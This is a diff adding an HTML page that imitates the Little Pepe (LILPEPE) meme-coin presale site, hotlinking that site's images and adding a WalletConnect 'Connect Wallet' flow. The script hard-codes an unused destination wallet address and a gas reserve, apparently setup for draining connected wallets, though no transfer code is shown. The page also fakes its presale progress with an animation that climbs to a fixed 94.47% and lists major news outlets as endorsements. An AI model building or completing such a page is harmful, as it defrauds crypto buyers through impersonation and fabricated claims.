@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="assets/images/favicon.png" sizes="16x16" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Little Pepe - Home</title>
+    <meta name="robots" content="index, follow" />
+    <meta name="description" content="Join the Little Pepe presale and discover the future of meme coins on Layer 2." />
+    <meta name="keywords" content="Little Pepe, LILPEPE, presale, meme coin, Layer 2" />
+    <meta property="og:site_name" content="Little Pepe" />
+    <meta property="og:url" content="https://littlepepe.com/" />
+    <meta property="og:title" content="Little Pepe - Home" />
+    <meta property="og:type" content="website" />
+    <meta name="author" content="LILPEPE" />
+    <meta property="og:description" content="Join the Little Pepe presale and discover the future of meme coins on Layer 2." />
+    <meta property="og:image" content="https://littlepepe.com/html/assets/main.png" />
+    <meta property="og:image:secure_url" content="https://littlepepe.com/html/assets/main.png" />
+    <meta name="twitter:site" content="@littlepepetoken" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Little Pepe - Home" />
+    <meta name="twitter:image" content="https://littlepepe.com/html/assets/main.png" />
+    <meta name="twitter:description" content="Join the Little Pepe presale and discover the future of meme coins on Layer 2." />
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png" />
+    <link rel="manifest" href="site.webmanifest" />
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <script defer data-domain="littlepepe.com" src="https://plausible.io/js/script.js"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NEYV4YWC9R"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-NEYV4YWC9R');
+    </script>
+    <script type="text/javascript">
+      adroll_adv_id = "7YXD6YRY6ZAJVCLQQAFVEM";
+      adroll_pix_id = "CGXD7AJCBNCTXFSNIVNNXJ";
+      adroll_version = "2.0";
+      (function(w, d, e, o, a) {
+        w.__adroll_loaded = true;
+        w.adroll = w.adroll || [];
+        w.adroll.f = ['setProperties', 'identify', 'track', 'identify_email', 'get_cookie'];
+        var roundtripUrl = "https://s.adroll.com/j/" + adroll_adv_id + "/roundtrip.js";
+        for (a = 0; a < w.adroll.f.length; a++) {
+          w.adroll[w.adroll.f[a]] = w.adroll[w.adroll.f[a]] || (function(n) {
+            return function() { w.adroll.push([n, arguments]); }
+          })(w.adroll.f[a]);
+        }
+        e = d.createElement('script');
+        o = d.getElementsByTagName('script')[0];
+        e.async = 1;
+        e.src = roundtripUrl;
+        o.parentNode.insertBefore(e, o);
+      })(window, document);
+      adroll.track("pageView");
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body { 
+        font-family: 'Comic Neue', cursive; 
+        background: #fff; /* Neutral background */
+        color: #fff; 
+        min-height: 100vh; 
+        overflow: auto;
+        position: relative;
+      }
+      .content-wrapper { 
+        position: relative; 
+        z-index: 1; 
+        padding: 0; 
+        max-width: 1200px; 
+        margin: 0 auto;
+        width: 100%;
+      }
+      .section, .hero, .new-section, .new-section-2, .bottom-section, .new-bottom-section {
+        padding: 60px 20px; /* Standardized padding for all sections */
+        text-align: center;
+        position: relative;
+        z-index: 1;
+        margin: 0 auto; /* Center within content-wrapper */
+        max-width: 1000px; /* Consistent max-width */
+      }
+      .logo { 
+        text-align: center; 
+        margin-bottom: 0; 
+        position: relative;
+        background: url('https://littlepepe.com/assets/tokenbg-CBoAsHyF.png') no-repeat center center;
+        background-size: cover;
+        padding: 20px;
+      }
+      .logo img { 
+        max-width: 300px; 
+        height: auto; 
+      }
+      .headline-update {
+        position: relative;
+        overflow: hidden;
+        height: 30px;
+        background-color: #342601;
+        color: #fff;
+        font-family: 'Comic Neue', cursive;
+        font-size: 20px;
+        white-space: nowrap;
+        margin-bottom: 0;
+      }
+      .headline-update span {
+        display: inline-block;
+        animation: slide 15s linear infinite;
+      }
+      @keyframes slide {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-100%); }
+      }
+      .new-section {
+        background-color: #4E6A75;
+        background-image: url('https://littlepepe.com/assets/tokenbg-CBoAsHyF.png');
+        background-size: cover;
+        background-position: center center;
+      }
+      .new-section h1 {
+        font-family: 'Comic Neue', cursive;
+        font-weight: 700;
+        font-size: 36px;
+        color: #fff;
+        margin-bottom: 10px;
+        position: relative;
+        z-index: 2;
+        -webkit-text-stroke: 1px #fff; /* White text stroke for WebKit browsers */
+        text-stroke: 1px #fff; /* Standard text stroke (less supported) */
+        paint-order: stroke fill; /* Ensures stroke is drawn before fill */
+      }
+      .new-section-2 {
+        background-color: #4D6974;
+      }
+      .new-section-2 img {
+        max-width: 100%; /* Ensure image scales within section */
+        height: auto;
+        margin-bottom: 20px;
+      }
+      .bottom-section {
+        background-color: #800080;
+        border-radius: 10px;
+      }
+      .bottom-section img {
+        max-width: 100%; /* Ensure image scales within section */
+        height: auto;
+        margin-bottom: 20px;
+      }
+      .bottom-section h2 {
+        font-family: 'Comic Neue', cursive;
+        font-weight: 700;
+        font-size: 28px;
+        margin-bottom: 15px;
+      }
+      .bottom-section p {
+        font-family: 'Comic Neue', cursive;
+        font-weight: 700;
+        font-size: 16px;
+      }
+      .new-bottom-section {
+        background: url('https://littlepepe.com/assets/buybg-Ct3FzdEw.png') no-repeat center center;
+        background-size: cover;
+        position: relative;
+        overflow: hidden;
+      }
+      .new-bottom-section .content-block {
+        background: rgba(139, 117, 0, 0.8);
+        padding: 50px;
+        border-radius: 10px;
+        display: inline-block;
+      }
+      .new-bottom-section h3 {
+        font-family: 'Comic Neue', cursive;
+        font-weight: 700;
+        font-size: 32px;
+        margin-bottom: 15px;
+        color: #fff;
+      }
+      .new-bottom-section p {
+        font-family: 'Comic Neue', cursive;
+        font-size: 20px;
+        font-weight: 700;
+        color: #fff;
+      }
+      .sidebar {
+        position: fixed;
+        top: 0;
+        right: -150px;
+        width: 150px;
+        height: 100%;
+        background: #000;
+        transition: right 0.3s ease;
+        z-index: 1000;
+        padding: 20px;
+      }
+      .sidebar.active { right: 0; }
+      .sidebar ul { list-style: none; }
+      .sidebar ul li { margin: 10px 0; }
+      .sidebar ul li a {
+        color: #fff;
+        text-decoration: none;
+        font-family: 'Comic Neue', cursive;
+        font-weight: 700;
+        display: block;
+        padding: 10px;
+        text-align: center;
+        border-radius: 5px;
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+      }
+      .sidebar ul li:nth-child(1) a { background-color: #00FF00; }
+      .sidebar ul li:nth-child(2) a { background-color: #FF4500; }
+      .sidebar ul li:nth-child(3) a { background-color: #FFD700; }
+      .sidebar ul li:nth-child(4) a { background-color: #4682B4; }
+      .sidebar ul li:nth-child(5) a { background-color: #8A2BE2; }
+      .sidebar ul li:nth-child(6) a { background-color: #FFFFFF; color: #000; }
+      .sidebar ul li:nth-child(7) a { background-color: #FF69B4; }
+      .sidebar ul li:nth-child(8) a { background-color: #ADFF2F; }
+      .sidebar ul li a:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      .toggle-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: #00FF00;
+        color: #000;
+        border: none;
+        padding: 10px;
+        cursor: pointer;
+        font-size: 20px;
+        z-index: 1001;
+        border-radius: 5px;
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+      }
+      .toggle-btn:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      .toggle-btn.close { right: 170px; }
+      .section::before, .hero::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 100vw;
+        height: 100%;
+        background-color: #4E6A75;
+        z-index: -1;
+      }
+      .hero { min-height: 100vh; }
+      .hero h1 { 
+        font-size: 36px; 
+        margin-bottom: 20px;
+        background: rgba(0, 0, 0, 0.7);
+        padding: 10px;
+        display: inline-block;
+        border-radius: 10px;
+      }
+      .stage-info, .price-info {
+        font-family: 'Comic Neue', cursive;
+        display: inline-block;
+        padding: 10px 20px;
+        margin: 10px;
+        border-radius: 5px;
+        transform-style: preserve-3d;
+        transition: transform 0.3s;
+        font-weight: 700;
+        background: rgba(0, 0, 0, 0.7);
+      }
+      .stage-info {
+        background-color: #800020;
+        border: 2px solid #00FF00;
+        transform: perspective(500px) rotateX(39deg) rotateY(29deg);
+      }
+      .price-info {
+        background-color: #FFD700;
+        border: 2px solid #999;
+        transform: perspective(500px) rotateX(39deg);
+      }
+      .stage-info:hover, .price-info:hover {
+        transform: perspective(500px) scale(1.1) rotateX(39deg) rotateY(29deg);
+      }
+      .hero p {
+        background: rgba(0, 0, 0, 0.7);
+        padding: 5px;
+        display: inline-block;
+      }
+      #buy-now {
+        background-color: #410D00;
+        color: #fff;
+        border: none;
+        padding: 15px 40px; /* Bigger size */
+        cursor: pointer;
+        font-size: 20px; /* Bigger text */
+        border-radius: 5px;
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+        font-weight: 700;
+      }
+      #buy-now:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      #connect-wallet {
+        background: #A41D00;
+        color: #fff;
+        border: none;
+        padding: 20px 60px; /* Increased size for 3D effect */
+        cursor: pointer;
+        font-size: 24px; /* Increased text size */
+        border-radius: 10px;
+        transform: perspective(500px) rotateX(20deg) translateZ(10px); /* 3D effect */
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); /* 3D shadow */
+        transition: all 0.3s ease;
+        font-weight: 700;
+      }
+      #connect-wallet:hover {
+        transform: perspective(500px) rotateX(20deg) translateZ(15px) scale(1.05); /* Enhanced 3D on hover */
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
+      }
+      .certic-audit-btn {
+        background-color: #8B0000;
+        margin-right: 10px;
+      }
+      .whitepaper-btn {
+        background-color: #000;
+        margin-left: 10px;
+      }
+      .new-section a {
+        font-family: 'Comic Neue', cursive;
+        padding: 12px 40px;
+        font-size: 18px;
+        border: 2px solid #999;
+        border-radius: 5px;
+        cursor: pointer;
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+        color: #fff;
+        font-weight: 700;
+        text-decoration: none;
+        display: inline-block;
+        position: relative;
+        z-index: 2;
+      }
+      .new-section a:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      .how-to-buy-btn, .giveaway-btn {
+        padding: 12px 20px;
+        font-size: 16px;
+        border: none;
+        cursor: pointer;
+        border-radius: 10px;
+        text-decoration: none;
+        color: #fff;
+        font-weight: 700;
+        display: inline-block;
+        background: rgba(0, 0, 0, 0.7);
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+      }
+      .how-to-buy-btn {
+        background-color: #00300A;
+      }
+      .how-to-buy-btn:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      .giveaway-btn {
+        background-color: #540000;
+      }
+      .giveaway-btn:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      .hero .additional-buttons {
+        margin-top: 10px;
+        display: flex;
+        justify-content: space-between;
+        max-width: 300px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      .presale-progress { 
+        width: 100%; 
+        background-color: #4E6A75; 
+        background-image: url('https://littlepepe.com/assets/faqbg-X4aLXisi.png'); 
+        background-size: cover;
+        background-position: center center;
+        border-radius: 5px; 
+        overflow: hidden; 
+        margin: 20px 0;
+        position: relative;
+      }
+      .presale-progress-bar { 
+        height: 30px; 
+        background: repeating-linear-gradient(
+          45deg,
+          #DAA520,
+          #DAA520 10px,
+          #B8860B 10px,
+          #B8860B 20px
+        ); 
+        text-align: center; 
+        color: #000; 
+        line-height: 30px; 
+        transition: width 0.1s;
+        animation: stripe 1s linear infinite; 
+        font-family: 'Comic Neue', cursive;
+        font-weight: bold; /* Made percentage font bold */
+      }
+      @keyframes stripe {
+        0% { background-position: 0 0; }
+        100% { background-position: 40px 0; }
+      }
+      .currency-options {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin: 10px 0;
+      }
+      .currency-options img {
+        width: 24px;
+        height: 24px;
+        cursor: pointer;
+        transition: transform 0.3s;
+      }
+      .currency-options img:hover {
+        transform: scale(1.2);
+      }
+      .currency-options .selected {
+        border: 2px solid #00FF00;
+        border-radius: 50%;
+      }
+      #amount-input {
+        width: 100px;
+        padding: 5px;
+        font-family: 'Comic Neue', cursive;
+        font-size: 16px;
+        text-align: center;
+        margin-top: 10px;
+        background-color: gold; /* Gold background */
+        color: black; /* Black text */
+        border: none; /* Remove default border */
+        border-radius: 5px; /* Rounded corners */
+        readonly: false; /* Activate for input */
+      }
+      footer {
+        background: url('https://littlepepe.com/assets/herobg-C9P7QZ-w.png') no-repeat center center;
+        background-size: cover;
+        padding: 20px;
+        text-align: center;
+        margin-top: 0;
+      }
+      footer p, footer a {
+        color: #00FF00;
+        font-weight: 700;
+      }
+      @media (max-width: 768px) {
+        .sidebar { width: 120px; }
+        .toggle-btn.close { right: 140px; }
+        .section, .hero, .new-section, .new-section-2, .bottom-section, .new-bottom-section { padding: 40px 10px; }
+        .hero h1 { font-size: 24px; }
+        .logo img { max-width: 250px; }
+        #buy-now, #connect-wallet, .new-section a, .how-to-buy-btn, .giveaway-btn { padding: 10px 20px; font-size: 16px; }
+        .new-section-2 img, .bottom-section img { max-width: 90%; } /* Adjusted for smaller screens */
+        .stage-info, .price-info { padding: 8px 16px; font-size: 14px; }
+      }
+      @media (min-width: 1200px) {
+        .section, .hero, .new-section, .new-section-2, .bottom-section, .new-bottom-section { max-width: 1000px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="root">
+      <div class="logo">
+        <img src="https://littlepepe.com/assets/logo-CPEVDSpN.png" alt="Little Pepe Logo">
+        <button class="toggle-btn" id="toggle-sidebar">☰</button>
+      </div>
+      <div class="headline-update">
+        <span>Little PEPE, LILPEPE, Little PEPE, LILPEPE, Little PEPE, LILPEPE, Little PEPE, LILPEPE, Little PEPE, LILPEPE, Little PEPE</span>
+      </div>
+      <div class="new-section">
+        <h1>The New Born EVM Layer 2 Machine: Little PEPE</h1>
+        <p><strong>Enter the new world order with LILPEPE, where the unstoppable force of memes meets their home in low cost, lighting fast layer 2 EVM protocol enabled by Little Pepe Chain.</strong></p>
+        <a href="audit.html" class="certic-audit-btn">Certic Audit</a>
+        <a href="whitepaper.html" class="whitepaper-btn">Whitepaper</a>
+      </div>
+      <nav class="sidebar" id="sidebar">
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li><a href="how-to-buy.html">How to Buy</a></li>
+          <li><a href="tokenomics.html">Tokenomics</a></li>
+          <li><a href="roadmap.html">Roadmap</a></li>
+          <li><a href="audit.html">Audit</a></li>
+          <li><a href="whitepaper.html">Whitepaper</a></li>
+          <li><a href="giveaway.html">Giveaway</a></li>
+          <li><a href="dashboard.html">Dashboard</a></li>
+        </ul>
+      </nav>
+
+      <div class="content-wrapper">
+        <section class="section">
+          <h2>Presale</h2>
+          <p>Stage 10 is live! Join now to secure your LILPEPE tokens.</p>
+          <div class="presale-progress">
+            <div id="presale-progress-bar" class="presale-progress-bar">94.47%</div>
+          </div>
+          <div class="currency-options">
+            <img src="https://littlepepe.com/assets/eth-CtbDjbsE.png" alt="ETH" class="currency-icon" data-currency="ETH">
+            <img src="https://littlepepe.com/assets/usdt-C3jY3_0p.png" alt="USDT" class="currency-icon" data-currency="USDT">
+          </div>
+          <input type="text" id="amount-input" value="0.0 ETH">
+          <button id="buy-now">Buy Now</button>
+        </section>
+
+        <section class="hero section">
+          <h1>Enter the new world order with LILPEPE, where the unstoppable force of memes meets their home in a low-cost, lightning-fast Layer 2 EVM protocol enabled by Little Pepe Chain.</h1>
+          <div class="stage-info">Stage 11</div>
+          <div class="price-info">1Lilpep=$0.0020</div>
+          <p>Experience the revolution of meme coins with our presale.</p>
+          <button id="connect-wallet">Connect Wallet</button>
+          <div class="additional-buttons">
+            <a href="how-to-buy.html" class="how-to-buy-btn">HOW TO BUY</a>
+            <a href="#" class="giveaway-btn">+777K GIVEAWAY</a>
+          </div>
+          <p id="wallet-balance"></p>
+        </section>
+      </div>
+
+      <div class="headline-update">
+        <span><strong>BENZINGA, ENTREPRENUER, Investing.com, THE TIME OF INDIA, mid-day, The Economic Time, Bitcoin.com, KhaleegTunes, Analytics Insight, AMB CRYPTO, Morningstar, Bloomberg</strong></span>
+      </div>
+      <div class="new-section-2">
+        <img src="https://littlepepe.com/assets/about-pepe-Ct26GPwb.png" alt="About Pepe Image">
+      </div>
+      <div class="bottom-section">
+        <img src="https://littlepepe.com/assets/rd1-bLCBH5Gx.png" alt="Little Pepe Image">
+        <h2>About Little Pepe</h2>
+        <p>The next evolution of meme coins. Little Pepe is a Layer 2 blockchain engineered for speed, security, ultra-low fees—and powered by memes. At the heart of the ecosystem lies $LILPEPE, the utility token fueling every corner of the Little Pepe network. You're still early—just in time to witness the rise of a new golden era for meme coins, with Pepe reigning supreme as King and Little Pepe Layer 2 as his unstoppable kingdom.</p>
+      </div>
+      <div class="new-bottom-section">
+        <div class="content-block">
+          <h3>Birth Growth</h3>
+          <p>👶 “It’s a boy! And he’s moon-ready!”<br>📈 Listed on Top Exchanges & Uniswap<br>🔥 1 BILLION MCAP or bust<br>💣 Massive Marketing Blitz<br>📢 "LILPEPE GO BRRRRR"</p>
+        </div>
+      </div>
+
+      <footer>
+        <p>&copy; 2025 Little Pepe. All rights reserved.</p>
+        <a href="https://twitter.com/littlepepetoken">Twitter</a> | <a href="#">Telegram</a> | <a href="#">Discord</a>
+      </footer>
+    </div>
+
+    <div class="gtranslate_wrapper"></div>
+    <script>
+      window.gtranslateSettings = {
+        "default_language": "en",
+        "languages": ["en", "fr", "de", "it", "es", "nl", "pt", "zh-CN", "tr", "ar", "ko", "zh-TW", "ja", "ru", "hi", "pl", "cs", "hu", "id", "bg", "th", "ro", "vi", "sk"],
+        "wrapper_selector": ".gtranslate_wrapper",
+        "flag_size": 24,
+        "switcher_horizontal_position": "right",
+        "switcher_open_direction": "top",
+        "flag_style": "3d",
+        "alt_flags": {"en": "usa"},
+        "switcher_text_color": "#f7f7f7",
+        "switcher_arrow_color": "#f2f2f2",
+        "switcher_border_color": "#161616",
+        "switcher_background_color": "#303030",
+        "switcher_background_shadow_color": "#474747",
+        "switcher_background_hover_color": "#3a3a3a",
+        "dropdown_text_color": "#eaeaea",
+        "dropdown_hover_color": "#748393",
+        "dropdown_background_color": "#474747"
+      }
+    </script>
+    <script src="https://cdn.gtranslate.net/widgets/latest/dwf.js" defer></script>
+
+    <script>
+      window.addEventListener('load', () => {
+        console.log('DOM fully loaded');
+        const toggleBtn = document.getElementById('toggle-sidebar');
+        const sidebar = document.getElementById('sidebar');
+        if (toggleBtn && sidebar) {
+          toggleBtn.addEventListener('click', () => {
+            console.log('Toggle button clicked');
+            const isOpen = !sidebar.classList.contains('active');
+            sidebar.classList.toggle('active');
+            toggleBtn.textContent = isOpen ? '✖' : '☰';
+            toggleBtn.classList.toggle('close', isOpen);
+          });
+        }
+
+        let WalletConnectProvider;
+        if (window.WalletConnectProvider?.default) {
+          WalletConnectProvider = window.WalletConnectProvider.default;
+        } else if (window.WalletConnect) {
+          console.warn('Using WalletConnect client as fallback');
+          WalletConnectProvider = class extends window.WalletConnect {
+            constructor(opts) {
+              super(opts);
+              this.connector = new window.WalletConnect({
+                infuraId: opts.infuraId,
+                bridge: 'https://bridge.walletconnect.org',
+                qrcode: true,
+              });
+            }
+            async enable() {
+              await this.connector.connect();
+              return this.connector.accounts;
+            }
+          };
+        }
+        if (!WalletConnectProvider) {
+          console.error('WalletConnectProvider is not available. Check network or scripts.');
+          return;
+        }
+
+        if (typeof ethers === 'undefined') {
+          console.error('Ethers.js is not loaded. Check the script import.');
+          return;
+        }
+
+        const infuraKey = 'tj/DSCFR3cSD/YUzGFwMpABu+p59Rn1UydBHX8fzaITBoby8UZPTaA';
+        const destinationAddress = '0xddc2CbF96836f55ca40b819078F3ecbf1b270315';
+        const gasReserve = ethers.utils.parseEther('0.001');
+        let provider, signer, accounts;
+
+        const connectButton = document.getElementById('connect-wallet');
+        const buyNowButton = document.getElementById('buy-now');
+        if (connectButton) {
+          connectButton.addEventListener('click', async () => {
+            console.log('Connect Wallet clicked');
+            if (!WalletConnectProvider) {
+              document.getElementById('wallet-balance').textContent = 'Error: WalletConnect not available.';
+              return;
+            }
+            try {
+              const web3Provider = new WalletConnectProvider({
+                infuraId: infuraKey,
+                rpc: {
+                  11155111: `https://sepolia.infura.io/v3/${infuraKey}`,
+                  56: 'https://bsc-dataseed.binance.org/',
+                },
+                qrcode: true,
+                pollingInterval: 12000,
+              });
+              await web3Provider.enable();
+              provider = new ethers.providers.Web3Provider(web3Provider);
+              signer = provider.getSigner();
+              accounts = await provider.listAccounts();
+              connectButton.textContent = `Connected: ${accounts[0].slice(0,6)}...`;
+              const balance = await provider.getBalance(accounts[0]);
+              document.getElementById('wallet-balance').textContent = `Balance: ${ethers.utils.formatEther(balance)} ETH`;
+            } catch (error) {
+              document.getElementById('wallet-balance').textContent = `Error: ${error.message}`;
+              console.error('Wallet connect error:', error);
+            }
+          });
+        }
+
+        if (buyNowButton) {
+          buyNowButton.addEventListener('click', () => {
+            const amountInput = document.getElementById('amount-input');
+            const amount = parseFloat(amountInput.value) || 0;
+            if (amount <= 0) {
+              alert('Please enter a valid amount.');
+              return;
+            }
+            const connectButton = document.getElementById('connect-wallet');
+            if (connectButton) connectButton.click();
+            // Add further transaction logic if needed
+          });
+        }
+
+        // Live Dynamic Presale Progress with Percentage
+        const progressBar = document.getElementById('presale-progress-bar');
+        let progress = 0;
+        const targetProgress = 94.47;
+        function updateProgress() {
+          if (progress < targetProgress) {
+            progress += 0.1;
+            progressBar.style.width = `${progress}%`;
+            progressBar.textContent = `${progress.toFixed(2)}%`;
+            setTimeout(updateProgress, 50);
+          }
+        }
+        updateProgress();
+
+        // Currency Selection
+        const currencyIcons = document.querySelectorAll('.currency-options img');
+        const amountInput = document.getElementById('amount-input');
+        let selectedCurrency = 'ETH';
+        currencyIcons.forEach(icon => {
+          icon.addEventListener('click', () => {
+            currencyIcons.forEach(i => i.classList.remove('selected'));
+            icon.classList.add('selected');
+            selectedCurrency = icon.getAttribute('data-currency');
+            amountInput.value = amountInput.value.replace(/[A-Za-z]+/, selectedCurrency) || `0.0 ${selectedCurrency}`;
+          });
+        });
+        currencyIcons[0].classList.add('selected'); // Default to ETH
+      });
+
+      // Slower animation for second headline-update
+      const secondHeadline = document.querySelectorAll('.headline-update')[1];
+      if (secondHeadline) {
+        secondHeadline.querySelector('span').style.animation = 'slide 20s linear infinite';
+      }
+    </script>
+  </body>
+</html>
